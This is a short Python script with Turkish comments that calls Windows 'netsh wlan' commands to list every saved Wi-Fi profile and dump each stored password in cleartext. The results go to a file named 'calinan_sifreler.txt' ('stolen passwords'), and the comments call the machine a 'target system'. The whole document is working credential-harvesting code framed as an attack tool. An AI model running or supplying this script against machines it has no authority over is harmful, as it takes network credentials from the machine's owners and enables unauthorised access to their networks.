import subprocess

# --- AŞAMA 1: MANTIK (THE BRAIN) ---
# Windows'un 'netsh' aracını Python ile yönetiyoruz.

def get_wifi_passwords():
    print("[*] Hedef sistem taranıyor...")
    
    # 1. Kayıtlı tüm ağ profillerini bul
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="ignore").split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    
    with open("calinan_sifreler.txt", "w") as f:
        for i in profiles:
            # 2. Her profilin şifresini 'key=clear' ile açık halde iste
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="ignore").split('\n')
                password = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                
                # 3. Sonucu dosyaya kaydet
                try:
                    f.write(f"AG ADI: {i:<20} | SIFRE: {password[0]}\n")
                    print(f"[+] Çekildi: {i}")
                except IndexError:
                    f.write(f"AG ADI: {i:<20} | SIFRE: [Şifresiz]\n")
            except:
                pass

if __name__ == "__main__":
    get_wifi_passwords()